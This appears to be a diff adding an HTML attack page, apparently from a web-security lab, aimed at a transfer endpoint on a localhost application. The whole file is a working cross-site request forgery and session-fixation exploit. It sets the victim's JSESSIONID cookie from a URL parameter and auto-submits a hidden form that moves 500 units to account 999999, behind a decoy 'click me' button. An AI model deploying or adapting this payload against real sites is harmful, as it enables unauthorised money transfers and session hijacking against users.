@@ -1,0 +1,17 @@
+<!-- So we execute this with the link below -->
+<!-- http://localhost:15000/XSSCSRFSESSION.html?JSESSIONID=sessionidparamhere -->
+
+<form action="http://localhost:15000/transfer" method="POST">
+    <input type="hidden" name="to" value="999999">
+    <input type="hidden" name="transferAmount" value="500">
+    <input type="submit" value="Not sus button click me">
+</form>
+<script>
+    // Get the session id from the URL parameter
+    const sessionidfromparam = new URLSearchParams(window.location.search);
+    const victimsessionid = sessionidfromparam.get('JSESSIONID');
+
+    // Set up our own session id to be the same as the victim's one
+    document.cookie = "JSESSIONID=" + victimsessionid + "; path=/";
+    document.forms[0].submit();
+</script>
